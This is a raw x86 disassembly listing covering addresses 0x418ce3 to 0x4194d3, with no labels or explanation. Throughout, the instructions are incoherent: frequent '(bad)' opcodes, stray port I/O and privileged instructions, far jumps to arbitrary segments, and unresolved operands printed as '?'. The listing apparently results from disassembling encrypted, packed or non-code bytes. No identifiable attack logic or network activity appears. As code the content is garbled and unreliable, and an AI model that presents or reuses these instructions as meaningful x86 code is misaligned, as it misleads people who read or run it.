  418ce3:	outs   dx,DWORD PTR ds:[esi]
  418ce4:	push   0x5ac2f484
  418ce9:	fadd   QWORD PTR [edx]
  418ceb:	or     esi,DWORD PTR [ecx-0x301351cb]
  418cf1:	iret   
  418cf2:	pop    ebp
  418cf3:	and    ah,ch
  418cf5:	stos   DWORD PTR es:[edi],eax
  418cf6:	inc    esp
  418cf7:	icebp  
  418cf8:	cld    
  418cf9:	adc    BYTE PTR [ebp+0x37],ah
  418cfc:	push   edx
  418cfd:	or     ah,BYTE PTR [ebx]
  418cff:	xchg   esi,eax
  418d00:	repz mov al,ds:0x94c5f57f
  418d06:	adc    BYTE PTR [edi],ch
  418d08:	pop    ds
  418d09:	push   esp
  418d0a:	xchg   ecx,ecx
  418d0c:	popf   
  418d0d:	fcomp  DWORD PTR [ebp-0x66]
  418d10:	bound  eax,QWORD PTR [eax]
  418d12:	push   ds
  418d13:	jnp    0x418cdb
  418d15:	add    BYTE PTR [ecx+0x5fffaa85],0xe8
  418d1c:	sbb    ebp,DWORD PTR ds:0xdee1483c
  418d22:	rol    DWORD PTR [edx],0x4a
  418d25:	enter  0x4a9c,0xfb
  418d29:	dec    edx
  418d2a:	push   0xcfb34bd4
  418d2f:	or     eax,0x380e6158
  418d34:	outs   dx,DWORD PTR ds:[esi]
  418d35:	cmp    al,0xb7
  418d37:	aaa    
  418d38:	push   ss
  418d39:	add    eax,0x429ed058
  418d3e:	sub    BYTE PTR [edx-0x226a3f2c],al
  418d44:	sbb    al,dl
  418d46:	adc    al,0x79
  418d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d49:	sar    DWORD PTR [esi],1
  418d4b:	mul    DWORD PTR [eax+0x1d2db91b]
  418d51:	jmp    0x418d89
  418d53:	push   cs
  418d54:	fwait
  418d55:	jne    0x418d05
  418d57:	add    BYTE PTR [eax+0x3f6b6336],0x2f
  418d5e:	mov    ah,0x42
  418d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d61:	rcr    BYTE PTR [edi-0x23e19786],1
  418d67:	fistp  QWORD PTR [esi]
  418d69:	outs   dx,DWORD PTR ds:[esi]
  418d6a:	fnstsw WORD PTR [edx+ecx*1+0x409b8701]
  418d71:	cmp    al,0xb1
  418d73:	push   edi
  418d74:	bound  esp,QWORD PTR [edi-0x2e6dacd8]
  418d7a:	mov    esp,0xde4b1c7c
  418d7f:	mov    ecx,0x1aab9a4b
  418d84:	mov    WORD PTR [ecx],ss
  418d86:	mov    ebp,0xea6408f5
  418d8b:	xchg   ebx,eax
  418d8c:	mov    ebp,0x20e1c246
  418d91:	xchg   edx,eax
  418d92:	int    0xce
  418d94:	in     eax,0xaa
  418d96:	je     0x418d5c
  418d98:	loope  0x418db6
  418d9a:	(bad)  
  418d9b:	adc    dh,dh
  418d9d:	icebp  
  418d9e:	loop   0x418d8a
  418da0:	or     al,0x7
  418da2:	xor    BYTE PTR [ebx+ebx*4],ch
  418da5:	jb     0x418d5a
  418da7:	out    0x8a,eax
  418da9:	popf   
  418daa:	mov    al,0xac
  418dac:	daa    
  418dad:	push   ebx
  418dae:	in     eax,0x73
  418db0:	dec    edx
  418db1:	inc    esp
  418db2:	cmp    BYTE PTR [ebp-0x27c3d551],0x8a
  418db9:	pop    ebx
  418dba:	jp     0x418d51
  418dbc:	and    ch,BYTE PTR [edi+ecx*1]
  418dbf:	imul   edx,ebp,0x994f128f
  418dc5:	out    0x26,eax
  418dc7:	sub    edx,DWORD PTR [ebx+0x58]
  418dca:	xor    al,0x38
  418dcc:	loope  0x418d51
  418dce:	int3   
  418dcf:	ret    
  418dd0:	(bad)  
  418dd1:	mov    eax,0xbb2cf111
  418dd6:	(bad)
  418dda:	stos   BYTE PTR es:[edi],al
  418ddb:	lds    esp,FWORD PTR ds:0xa8982185
  418de1:	fcomp  QWORD PTR ds:0x68d11878
  418de7:	mov    dl,0x95
  418de9:	fidivr DWORD PTR [ebx+0x6b]
  418dec:	mov    dl,0xec
  418dee:	fild   WORD PTR [ebx]
  418df0:	add    ebx,esi
  418df2:	mov    ecx,0x1ed5b68b
  418df7:	cmp    al,0x1c
  418df9:	cmp    al,0x57
  418dfb:	sti    
  418dfc:	sar    ebp,1
  418dfe:	xchg   ebx,eax
  418dff:	js     0x418dda
  418e01:	mov    cl,0x8b
  418e03:	shl    DWORD PTR [edi],cl
  418e05:	in     al,0x48
  418e07:	and    al,0x24
  418e09:	inc    BYTE PTR [edi-0x5b79ee17]
  418e0f:	mov    bl,0x88
  418e11:	imul   eax,DWORD PTR [esi],0x707f589a
  418e17:	shr    DWORD PTR [ecx],cl
  418e19:	ret    0xc15c
  418e1c:	inc    edi
  418e1d:	cmp    DWORD PTR [ebp-0x50],0x5
  418e21:	popf   
  418e22:	mov    edx,0xab9c6e7d
  418e27:	or     eax,0xecd7d5c8
  418e2c:	sub    bh,al
  418e2e:	inc    ebp
  418e2f:	test   DWORD PTR [ebx+0x70],eax
  418e32:	stos   BYTE PTR es:[edi],al
  418e33:	out    dx,eax
  418e34:	imul   edi,DWORD PTR [eax+0x7f],0x2c
  418e38:	pop    ebp
  418e39:	ds jno 0x418e57
  418e3c:	adc    esi,eax
  418e3e:	dec    esi
  418e3f:	enter  0xddf8,0x61
  418e43:	jbe    0x418ea5
  418e45:	xchg   DWORD PTR [ecx+eax*8],ebx
  418e48:	stos   DWORD PTR es:[edi],eax
  418e49:	fwait
  418e4a:	xor    edx,DWORD PTR [eax+0x20]
  418e4d:	imul   esp,DWORD PTR [ebp+ebx*2+0x662a6f56],0x7e
  418e55:	int    0x34
  418e57:	sub    bl,0x78
  418e5a:	xchg   edx,eax
  418e5b:	or     edx,DWORD PTR [ebx-0x1d7c7ce8]
  418e61:	repz mov edx,0x8de6f238
  418e67:	stos   BYTE PTR es:[edi],al
  418e68:	lock mov cl,0x1c
  418e6b:	aaa    
  418e6c:	mov    cl,0x6a
  418e6e:	push   0x2d1e5451
  418e73:	dec    esi
  418e74:	mov    al,0x11
  418e76:	sub    al,0x4f
  418e78:	add    edi,edx
  418e7a:	mov    al,0xac
  418e7c:	(bad)  
  418e7d:	cld    
  418e7e:	fs push 0xffffffbe
  418e81:	aam    0x85
  418e83:	push   ecx
  418e84:	sub    ah,BYTE PTR [eax+0x9]
  418e87:	lds    eax,FWORD PTR [esi+esi*8-0x4cdf3713]
  418e8e:	into   
  418e8f:	stos   BYTE PTR es:[edi],al
  418e90:	(bad)  
  418e91:	mov    esi,0xef766e56
  418e96:	dec    edx
  418e97:	ror    BYTE PTR [esi+ebx*8-0x5940fdf1],0xd1
  418e9f:	jb     0x418eeb
  418ea1:	fdivr  DWORD PTR [ecx-0x3787c50f]
  418ea7:	out    0x12,eax
  418ea9:	inc    ecx
  418eaa:	mov    al,ds:0xc1a3a542
  418eaf:	push   ss
  418eb0:	sub    ebx,DWORD PTR [ecx+0x37]
  418eb3:	cmp    ah,ch
  418eb5:	jb     0x418e74
  418eb7:	ins    BYTE PTR es:[edi],dx
  418eb8:	gs stos BYTE PTR es:[edi],al
  418eba:	mov    al,ds:0x5debb270
  418ec0:	(bad)  
  418ec1:	loope  0x418eb4
  418ec3:	inc    edx
  418ec4:	add    DWORD PTR [ecx],0x46
  418ec7:	mov    edx,0x582aec94
  418ecc:	in     al,0xd2
  418ece:	mov    ah,BYTE PTR [eax+ecx*2+0x56]
  418ed2:	mov    DWORD PTR [eax+edx*2-0x536c6232],eax
  418ed9:	repnz out 0x7d,al
  418edc:	or     eax,0xabc27aad
  418ee1:	add    BYTE PTR [ecx-0x63],al
  418ee4:	mov    ds:0x6c53b581,al
  418ee9:	adc    eax,0xfae32ccf
  418eee:	int3   
  418eef:	sub    bl,BYTE PTR [esi-0x692a43a3]
  418ef5:	lock xchg ecx,eax
  418ef7:	rol    ebx,0x2d
  418efa:	cmp    DWORD PTR [edx],0x3b
  418efd:	clc    
  418efe:	or     dl,BYTE PTR [ecx]
  418f00:	add    dl,BYTE PTR [ebx+0x7a]
  418f03:	popf   
  418f04:	add    edx,edi
  418f06:	cmp    eax,0x70e57d59
  418f0b:	mov    ah,BYTE PTR [esp+eax*8-0x61]
  418f0f:	stos   DWORD PTR es:[edi],eax
  418f10:	dec    edi
  418f11:	std    
  418f12:	mov    dh,0xf5
  418f14:	adc    dh,BYTE PTR [eax-0x548ea5ff]
  418f1a:	push   edx
  418f1b:	dec    edx
  418f1c:	cmp    eax,0x422184d
  418f21:	les    ecx,FWORD PTR [edx+0x70]
  418f24:	in     eax,0xce
  418f26:	push   0x4
  418f28:	bound  ebp,QWORD PTR [ebx+0x70]
  418f2b:	arpl   WORD PTR [ebx+0xeeedb2a],bp
  418f31:	mov    esp,0x44a50b3f
  418f36:	fs dec ecx
  418f38:	inc    eax
  418f39:	(bad)  
  418f3a:	popf   
  418f3b:	jae    0x418ed2
  418f3d:	sub    DWORD PTR [ebx],edx
  418f3f:	data16 jne 0x418eeb
  418f42:	cld    
  418f43:	nop
  418f44:	push   ds
  418f45:	icebp  
  418f46:	cmp    eax,0xe3c98f2f
  418f4b:	retf   0xc1c
  418f4e:	rcr    DWORD PTR [esi+0x7f],cl
  418f51:	pop    ebp
  418f52:	cli    
  418f53:	dec    ebx
  418f54:	fs jmp 0x64bb2ea
  418f5a:	sub    ebx,DWORD PTR [ebx-0x6f031ad4]
  418f60:	gs nop
  418f62:	jmp    0xa3d:0x4a147d3e
  418f69:	dec    ecx
  418f6a:	test   BYTE PTR [ebp-0x12386d60],bl
  418f70:	push   cs
  418f71:	cmp    bl,BYTE PTR [edx]
  418f73:	jecxz  0x418fcc
  418f75:	mov    WORD PTR [ebx+0x27f1284a],fs
  418f7b:	inc    esi
  418f7c:	adc    ah,BYTE PTR [edx+0x1e105cd]
  418f82:	mov    cl,0xaa
  418f84:	cmp    BYTE PTR [ecx+0x34a85ed5],dh
  418f8a:	push   esp
  418f8b:	mov    ebx,0xe548e6e1
  418f90:	add    al,0x1a
  418f92:	jne    0x418f48
  418f94:	sub    eax,0xb4c5b653
  418f99:	ins    BYTE PTR es:[edi],dx
  418f9a:	cmp    eax,0xe18adea8
  418f9f:	dec    edi
  418fa0:	mov    cl,0xf7
  418fa2:	adc    eax,0xc550b074
  418fa7:	jecxz  0x418f30
  418fa9:	cwde   
  418faa:	inc    DWORD PTR [edx]
  418fac:	cmp    BYTE PTR [ebp+0x23],cl
  418faf:	xchg   edx,eax
  418fb0:	adc    ecx,ebx
  418fb2:	jmp    0x418fa0
  418fb4:	gs stos DWORD PTR es:[edi],eax
  418fb6:	mov    cl,ch
  418fb8:	push   edx
  418fb9:	sbb    eax,0xb8ba1b00
  418fbe:	add    BYTE PTR [esp+ebp*8+0x6d98d258],al
  418fc5:	fs jp  0x41901a
  418fc8:	push   edx
  418fc9:	ds dec esi
  418fcb:	in     eax,0xd2
  418fcd:	sub    ebp,DWORD PTR [ebp+0xa3f750f]
  418fd3:	cs jno 0x418fc0
  418fd6:	dec    dx
  418fd8:	repz xchg esi,eax
  418fda:	add    BYTE PTR [ebx+ebx*4],ah
  418fdd:	stos   DWORD PTR es:[edi],eax
  418fde:	retf   
  418fdf:	lds    esp,FWORD PTR [ebx-0x1]
  418fe2:	outs   dx,DWORD PTR ds:[esi]
  418fe3:	push   cs
  418fe4:	in     al,0xbe
  418fe6:	ins    BYTE PTR es:[edi],dx
  418fe7:	fnstenv [edx-0x62]
  418fea:	pop    esi
  418feb:	xor    DWORD PTR [eax-0x1e51a2f4],0xd6c65972
  418ff5:	in     al,dx
  418ff6:	loopne 0x419036
  418ff8:	pop    edi
  418ff9:	ficomp DWORD PTR [edx+esi*4+0x47ee43aa]
  419000:	retf   
  419001:	jl     0x41900f
  419003:	pop    edx
  419004:	fld    QWORD PTR [esi+0x3dd0a872]
  41900a:	and    BYTE PTR [edi+eiz*1-0x62],0x16
  41900f:	cdq    
  419010:	icebp  
  419011:	stos   DWORD PTR es:[edi],eax
  419012:	jecxz  0x419015
  419014:	mov    eax,0x49c0431f
  419019:	mov    edx,0xd7f60dbb
  41901e:	lods   al,BYTE PTR ds:[esi]
  41901f:	jg     0x418fe6
  419021:	pushf  
  419022:	out    dx,al
  419023:	push   esi
  419024:	cs dec edi
  419026:	sub    bl,0x6f
  419029:	adc    dh,BYTE PTR [esi]
  41902b:	or     eax,0xc745ebc3
  419030:	aaa    
  419031:	add    DWORD PTR ds:0x3850f64c,0xde7b90ae
  41903b:	lods   eax,DWORD PTR ds:[esi]
  41903c:	das    
  41903d:	dec    eax
  41903e:	pop    edi
  41903f:	add    bl,BYTE PTR [ecx-0x4]
  419042:	sti    
  419043:	aas    
  419044:	shl    BYTE PTR [edi-0x58],1
  419047:	jno    0x41903f
  419049:	pop    esp
  41904a:	mov    edi,0x32878da8
  41904f:	cmp    DWORD PTR [esi],edi
  419051:	pop    ds
  419052:	ds adc eax,0x40e03ed7
  419058:	fisub  WORD PTR [eax+ebx*2+0xe]
  41905c:	ins    DWORD PTR es:[edi],dx
  41905d:	jno    0x4190b9
  41905f:	or     eax,0xb3378cad
  419064:	cmp    eax,0x5aba1f8f
  419069:	cwde   
  41906a:	imul   ebp,eax,0x61
  41906d:	(bad)  
  41906e:	jmp    0x2d07:0x69a798c
  419075:	push   ss
  419076:	cwde   
  419077:	xlat   BYTE PTR ds:[ebx]
  419078:	iret   
  419079:	popa   
  41907a:	popa   
  41907b:	inc    ebp
  41907c:	es jl  0x419078
  41907f:	adc    eax,0x28a0da8a
  419084:	fild   DWORD PTR [eax]
  419086:	aas    
  419087:	inc    ecx
  419089:	jg     0x4190bc
  41908b:	das    
  41908c:	sbb    eax,0xab1ee5d
  419091:	aam    0x77
  419093:	pop    ebx
  419094:	aam    0xb0
  419096:	daa    
  419097:	inc    edi
  419098:	sbb    DWORD PTR [edx],0xfda83874
  41909e:	jno    0x419063
  4190a0:	imul   ebp,edx,0x882485a9
  4190a6:	xchg   BYTE PTR [ebx+0x1d],dl
  4190a9:	sti    
  4190aa:	test   eax,0xe2d52120
  4190af:	mov    cl,0xef
  4190b1:	das    
  4190b2:	adc    cl,al
  4190b4:	xchg   edx,eax
  4190b5:	dec    edx
  4190b6:	std    
  4190b7:	test   al,0x9e
  4190b9:	jne    0x4190de
  4190bb:	xchg   ebx,esi
  4190bd:	xlat   BYTE PTR ds:[ebx]
  4190be:	dec    eax
  4190bf:	dec    ebx
  4190c0:	rol    BYTE PTR [esi+eax*8],0x15
  4190c4:	out    0x14,eax
  4190c6:	leave  
  4190c7:	jmp    0xa34bb311
  4190cc:	sahf   
  4190cd:	inc    ebp
  4190ce:	sub    BYTE PTR [edx],al
  4190d0:	xchg   edi,eax
  4190d1:	cmp    al,0x93
  4190d3:	and    bh,0xa4
  4190d6:	mov    ch,0x43
  4190d8:	sti    
  4190d9:	pop    esi
  4190da:	fmul   DWORD PTR [edi+0x4a]
  4190dd:	sbb    ebp,DWORD PTR [ecx]
  4190df:	xor    edi,edx
  4190e1:	jo     0x419124
  4190e3:	xor    edx,DWORD PTR [edx+0x64286ec6]
  4190e9:	add    ch,BYTE PTR [eax-0x300afd]
  4190ef:	aas    
  4190f0:	std    
  4190f1:	fst    QWORD PTR [esi+0x134549ad]
  4190f7:	inc    esi
  4190f8:	ins    BYTE PTR es:[edi],dx
  4190f9:	outs   dx,DWORD PTR ds:[esi]
  4190fa:	push   edi
  4190fb:	jmp    0xac6a:0x1a851799
  419102:	inc    esp
  419103:	cli    
  419104:	and    dh,BYTE PTR [eax+eiz*1+0x180988f]
  41910b:	cmp    ebp,DWORD PTR [ebp+0x10]
  41910e:	in     eax,dx
  41910f:	dec    edx
  419110:	outs   dx,BYTE PTR ds:[esi]
  419111:	aas    
  419112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419113:	or     cl,al
  419115:	mov    ah,0xf1
  419117:	mov    ebp,0x75b00e62
  41911c:	inc    esp
  41911d:	je     0x41917e
  41911f:	dec    ebx
  419120:	imul   ebp,DWORD PTR [edx-0x3b],0x83357ed5
  419127:	dec    ebx
  419128:	test   al,0x4f
  41912a:	aas    
  41912b:	jnp    0x4190ec
  41912d:	dec    edx
  41912e:	cwde   
  41912f:	xor    eax,0x64b62315
  419134:	arpl   WORD PTR [ecx-0x21],di
  419137:	mov    edx,0xe0ba1638
  41913c:	cmove  ebp,DWORD PTR ss:[edx-0x619c6e3b]
  419144:	ins    DWORD PTR es:[edi],dx
  419145:	fldenv [eax-0x33]
  419148:	adc    al,0x3e
  41914a:	adc    al,al
  41914c:	sti    
  41914d:	stc    
  41914e:	lahf   
  41914f:	dec    esi
  419150:	rcr    edi,cl
  419152:	xchg   ecx,eax
  419153:	aad    0x7c
  419155:	and    ah,BYTE PTR [esi]
  419157:	xor    eax,0x3908edf2
  41915c:	mov    ecx,0xb60a74fd
  419161:	popf   
  419162:	ins    BYTE PTR es:[edi],dx
  419163:	mov    ah,0x4
  419165:	mov    bh,0xd3
  419167:	sub    eax,0x88c4d221
  41916c:	pop    ss
  41916d:	sahf   
  41916e:	outs   dx,DWORD PTR ds:[esi]
  41916f:	aam    0xf8
  419171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419172:	sahf   
  419173:	xor    edx,esp
  419175:	mov    esp,0x2735e7f0
  41917a:	aam    0x56
  41917c:	popa   
  41917d:	repnz mov cl,0xd
  419180:	(bad)  
  419181:	pop    ds
  419182:	xor    BYTE PTR [esi+0x68],dh
  419185:	sub    eax,DWORD PTR es:[ebp-0x13]
  419189:	push   ebx
  41918a:	test   eax,0x916a34d7
  41918f:	cmp    BYTE PTR [esi],cl
  419191:	stos   DWORD PTR es:[edi],eax
  419192:	jno    0x41917a
  419194:	pop    esp
  419195:	test   DWORD PTR [ebx-0x75],ebx
  419198:	dec    esp
  419199:	or     esi,DWORD PTR ds:0x99c1eefd
  41919f:	push   DWORD PTR [ecx]
  4191a1:	mov    ecx,0x635d70b6
  4191a6:	adc    BYTE PTR [edx-0x4f9b7ab1],bh
  4191ac:	jl     0x419196
  4191ae:	add    BYTE PTR [ebp-0x16a0ad80],0xd8
  4191b5:	(bad)  
  4191b6:	ja     0x419207
  4191b8:	jge    0x4191f9
  4191ba:	scas   al,BYTE PTR es:[edi]
  4191bb:	addr16 push edi
  4191bd:	dec    ebp
  4191be:	push   es
  4191bf:	adc    edi,ecx
  4191c1:	(bad)  
  4191c2:	(bad)  
  4191c3:	(bad)
  4191c6:	add    DWORD PTR [ecx],eax
  4191c8:	bound  ecx,QWORD PTR [edi-0x4884a25b]
  4191ce:	jle    0x41917f
  4191d0:	aaa    
  4191d1:	pop    esi
  4191d2:	mov    WORD PTR [eax-0x6a],?
  4191d5:	push   0xffffffba
  4191d7:	sahf   
  4191d8:	fsubr  st(5),st
  4191da:	ja     0x4191ea
  4191dc:	inc    edx
  4191dd:	ficomp DWORD PTR [ebp-0x2b3cdef3]
  4191e3:	pusha  
  4191e4:	sub    ebx,DWORD PTR [ebx]
  4191e6:	mov    ds:0x797363d3,al
  4191eb:	repz dec edx
  4191ed:	enter  0x75db,0x9c
  4191f1:	aaa    
  4191f2:	loope  0x4191e7
  4191f4:	pop    eax
  4191f5:	jle    0x41917e
  4191f7:	jmp    0x7be3:0x8cd0ac8d
  4191fe:	lahf   
  4191ff:	jns    0x419206
  419201:	js     0x4191ed
  419203:	aad    0x70
  419205:	sti    
  419206:	inc    ecx
  419207:	iret   
  419208:	and    al,ah
  41920a:	mov    ds:0xfb17b0f9,eax
  41920f:	pop    ebx
  419210:	mov    bh,0xe5
  419212:	and    cl,BYTE PTR cs:[eax]
  419215:	jle    0x419199
  419217:	call   0xf9b0:0x5d3a4d2e
  41921e:	xchg   edx,eax
  41921f:	sub    ebx,ebx
  419221:	inc    ecx
  419222:	fild   QWORD PTR [edi-0x62]
  419225:	cli    
  419226:	clc    
  419227:	mov    edi,0xa3547424
  41922c:	push   cs
  41922d:	fst    QWORD PTR [ebp+0x1a]
  419230:	xor    al,0x16
  419232:	lds    edx,FWORD PTR [esi+0xbba80d3]
  419238:	jnp    0x4191c5
  41923a:	es cld 
  41923c:	fiadd  WORD PTR [ecx]
  41923e:	mov    ebx,0xd5abcc29
  419243:	mov    edx,0xaf0bd0e5
  419248:	xchg   esp,eax
  419249:	out    dx,eax
  41924a:	adc    al,BYTE PTR [eax]
  41924c:	sbb    ah,bl
  41924e:	shl    BYTE PTR [eax],0xdb
  419251:	out    dx,eax
  419252:	fidiv  WORD PTR [ebx-0x29]
  419255:	fimul  DWORD PTR [edi-0x3ff42b3b]
  41925b:	sub    ch,dh
  41925d:	fmul   DWORD PTR [ecx+0xe]
  419260:	sub    bl,dh
  419262:	mov    al,ds:0x9b7b5825
  419267:	addr16 mov ds:0xe067,al
  41926b:	fwait
  41926c:	pop    ecx
  41926d:	(bad)  
  41926f:	ja     0x4192ae
  419271:	or     eax,0x89a75974
  419276:	xchg   DWORD PTR [esi-0x70ed77b9],ebp
  41927c:	daa    
  41927d:	cmc    
  41927e:	cwde   
  41927f:	icebp  
  419280:	pop    edx
  419281:	(bad)  
  419282:	retf   
  419283:	ins    BYTE PTR es:[edi],dx
  419284:	jl     0x4192d0
  419286:	sbb    DWORD PTR [ebp-0x1a],esi
  419289:	out    0xe8,eax
  41928b:	add    eax,0x6a586af5
  419290:	or     DWORD PTR [edx-0x6d],ecx
  419293:	sbb    ebp,edi
  419295:	sbb    eax,0x8ffd7f36
  41929a:	jns    0x41921c
  41929c:	cs out 0xcd,al
  41929f:	and    eax,0x7aec9ad
  4192a4:	je     0x419255
  4192a6:	hlt    
  4192a7:	lds    esi,FWORD PTR [ecx+0x347293cc]
  4192ad:	gs in  al,dx
  4192af:	mov    esi,0x54880134
  4192b4:	mov    eax,ds:0x32b859b5
  4192b9:	jg     0x419261
  4192bb:	imul   ebx,DWORD PTR [eax],0xffffffee
  4192be:	nop
  4192bf:	pop    ebx
  4192c0:	aas    
  4192c1:	mov    ds:0x807d0810,eax
  4192c6:	push   ss
  4192c7:	out    dx,al
  4192c8:	or     al,0xb3
  4192ca:	inc    ecx
  4192cb:	mov    bh,0x3e
  4192cd:	stc    
  4192ce:	inc    edx
  4192cf:	aad    0x71
  4192d1:	jbe    0x4192e3
  4192d3:	mov    al,0xcf
  4192d5:	sub    al,0x35
  4192d7:	dec    esi
  4192d8:	pop    esp
  4192d9:	rol    BYTE PTR [edx+0x65],0xa5
  4192dd:	scas   al,BYTE PTR es:[edi]
  4192de:	out    0xb5,eax
  4192e0:	adc    DWORD PTR [edi+0x2b5e8a19],ebx
  4192e6:	ins    DWORD PTR es:[edi],dx
  4192e7:	mov    ds:0x69f832eb,eax
  4192ec:	mov    ecx,0x9837ca3a
  4192f1:	fs pusha 
  4192f3:	mov    ebp,DWORD PTR [ebx]
  4192f5:	mov    WORD PTR [ebp-0x31],?
  4192f8:	sub    cl,ch
  4192fa:	jo     0x4192e7
  4192fc:	aas    
  4192fd:	in     eax,0x8
  4192ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419300:	retf   0xb3b1
  419303:	mov    esp,0x46cf21f9
  419308:	add    BYTE PTR [edx],cl
  41930a:	mov    ds:0xbb7b450c,eax
  41930f:	xor    BYTE PTR [edx+0x376b593f],0xf2
  419316:	ficomp WORD PTR [edi]
  419318:	in     eax,0x6c
  41931a:	pop    es
  41931b:	fcomp  DWORD PTR ds:0x86e956e
  419321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419322:	fisubr DWORD PTR [edx-0x73116ed9]
  419328:	jmp    0x3af5:0x1daf98e3
  41932f:	gs (bad) 
  419331:	int    0x93
  419333:	jecxz  0x419324
  419335:	mov    edx,0x725b361a
  41933a:	sbb    DWORD PTR [edx-0x62f1a1d1],ebp
  419340:	adc    DWORD PTR [ebp+0x3982fed4],ebp
  419346:	fs cmp eax,0x4eba53d5
  41934c:	int    0x42
  41934e:	xor    al,0x9d
  419350:	jbe    0x4193ca
  419352:	pop    esp
  419353:	push   esi
  419354:	imul   edi,DWORD PTR [edi+0x25d610f5],0xfffffff8
  41935b:	repz or BYTE PTR [esi-0x2148d491],cl
  419362:	dec    edi
  419363:	push   ecx
  419364:	add    BYTE PTR [edi],dh
  419366:	push   0x6d09100f
  41936b:	cmp    al,0x64
  41936d:	gs cs repnz sub eax,0xc0142a9b
  419375:	sbb    dl,bl
  419377:	xor    al,0x10
  419379:	imul   ebx,DWORD PTR [esi+0x232676b],0x8f422ef1
  419383:	and    eax,0xf4531bc7
  419388:	xchg   ecx,eax
  419389:	or     al,0x18
  41938b:	push   esp
  41938c:	adc    al,BYTE PTR [ecx-0x61f4b52f]
  419392:	or     BYTE PTR [ebx-0x5539bedb],0xee
  419399:	imul   eax,DWORD PTR [esi],0xffffffc9
  41939c:	cmp    al,0x43
  41939e:	xor    esi,esp
  4193a0:	(bad)  
  4193a1:	iret   
  4193a2:	pop    ss
  4193a3:	dec    esi
  4193a4:	aaa    
  4193a5:	ret    0xb43e
  4193a8:	cmp    BYTE PTR [esi-0x7c],dl
  4193ab:	add    al,0x69
  4193ad:	xor    DWORD PTR [ecx+eax*2],ecx
  4193b0:	sub    bl,BYTE PTR [ebx]
  4193b2:	fdivr  st,st(0)
  4193b4:	sub    edx,DWORD PTR [edi]
  4193b6:	(bad)  
  4193b7:	xor    ecx,edx
  4193b9:	stc    
  4193ba:	ret    0x2af0
  4193bd:	loop   0x419346
  4193bf:	xor    BYTE PTR [eax],cl
  4193c1:	pop    ds
  4193c2:	sub    BYTE PTR ds:0xafb4fb59,ah
  4193c8:	popa   
  4193c9:	inc    ebx
  4193ca:	sub    DWORD PTR [ebx+0x14],ebp
  4193cd:	mov    bl,0xda
  4193cf:	mov    bh,0x79
  4193d1:	sti    
  4193d2:	cdq    
  4193d3:	retf   
  4193d4:	jno    0x419428
  4193d6:	and    al,0x93
  4193d8:	(bad)  
  4193d9:	cld    
  4193da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193db:	inc    ebp
  4193dc:	fist   DWORD PTR [ecx]
  4193de:	or     eax,0x5eac84d7
  4193e3:	inc    ecx
  4193e4:	addr16 inc esp
  4193e6:	jbe    0x4193bd
  4193e8:	and    bh,dl
  4193ea:	in     eax,dx
  4193eb:	sar    BYTE PTR [edx],1
  4193ed:	sbb    ch,BYTE PTR [eax-0x2e]
  4193f0:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4193f2:	mov    ebx,0x2b9c854e
  4193f7:	cmc    
  4193f8:	div    DWORD PTR [esp+ebp*1-0x2]
  4193fc:	adc    eax,0xfd4edaaf
  419401:	idiv   esi
  419403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419404:	ss (bad) 
  419407:	out    dx,eax
  419408:	mov    dh,0x18
  41940a:	loope  0x4193a3
  41940c:	xchg   esp,eax
  41940d:	pop    eax
  41940e:	scas   eax,DWORD PTR es:[edi]
  41940f:	rcl    BYTE PTR [edi+0x22],1
  419412:	retf   0x8438
  419415:	repz fs call 0x1e6481a5
  41941c:	xchg   esi,eax
  41941d:	scas   al,BYTE PTR es:[edi]
  41941e:	xchg   esi,eax
  41941f:	sub    BYTE PTR [ebx-0x2b],dl
  419422:	out    dx,eax
  419423:	jne    0x4193fa
  419425:	mov    esi,0x190b014c
  41942a:	out    dx,al
  41942b:	adc    BYTE PTR [edi-0x72],ah
  41942e:	aas    
  41942f:	xor    BYTE PTR [ebp-0x7a],cl
  419432:	push   ss
  419433:	rcr    BYTE PTR [esi-0x67ed14b],0x6e
  41943a:	pushf  
  41943b:	daa    
  41943c:	pop    ss
  41943d:	fstp   QWORD PTR [ebx+0x57]
  419440:	or     DWORD PTR ds:0xe761cc32,0xffffff97
  419447:	adc    eax,0x4699207e
  41944c:	cli    
  41944d:	jmp    0x4d359f93
  419452:	jae    0x419478
  419454:	out    dx,al
  419455:	pop    es
  419456:	cwde   
  419457:	mov    eax,ds
  419459:	movsx  edi,bx
  41945c:	out    0x50,eax
  41945e:	jne    0x419447
  419460:	in     al,dx
  419461:	test   al,0x77
  419463:	leave  
  419464:	ins    BYTE PTR es:[edi],dx
  419465:	jb     0x4194c9
  419467:	xchg   esi,eax
  419468:	jecxz  0x4194aa
  41946a:	clc    
  41946b:	mov    ecx,0x1b627fa
  419470:	jae    0x41944f
  419472:	pop    eax
  419473:	push   edi
  419474:	fisttp WORD PTR [edx]
  419476:	sbb    al,0xb2
  419478:	mov    esp,0xd83ec16d
  41947d:	and    DWORD PTR [ebp-0x592dec27],ebx
  419483:	mov    ah,0x27
  419485:	xlat   BYTE PTR ds:[ebx]
  419486:	push   eax
  419487:	mov    cl,0x93
  419489:	pop    edx
  41948a:	mov    ah,0x2a
  41948c:	jns    0x41944a
  41948e:	jge    0x419464
  419490:	outs   dx,BYTE PTR ds:[esi]
  419491:	cmp    al,0xb7
  419494:	test   DWORD PTR [ecx+eax*1],edx
  419497:	cld    
  419498:	push   0xd9bfc088
  41949d:	adc    ch,BYTE PTR [esi+0x17]
  4194a0:	popa   
  4194a1:	mov    eax,esi
  4194a3:	and    ebx,edi
  4194a5:	cwde   
  4194a6:	mov    bl,BYTE PTR [eax+0xc8258f1]
  4194ac:	cmp    DWORD PTR [ecx+0x1ce8123],ebx
  4194b2:	or     eax,0x78ca364c
  4194b7:	mov    esi,0xa888fc45
  4194bc:	dec    esi
  4194bd:	mov    ch,BYTE PTR [edi+ebp*4]
  4194c0:	outs   dx,DWORD PTR ds:[esi]
  4194c1:	jne    0x4194f9
  4194c3:	xor    eax,0x477b8f56
  4194c8:	and    ebx,DWORD PTR [ecx]
  4194ca:	aas    
  4194cb:	mov    ?,ecx
  4194cd:	xor    eax,0x702aed70
  4194d2:	pop    eax
  4194d3:	jle    0x419500
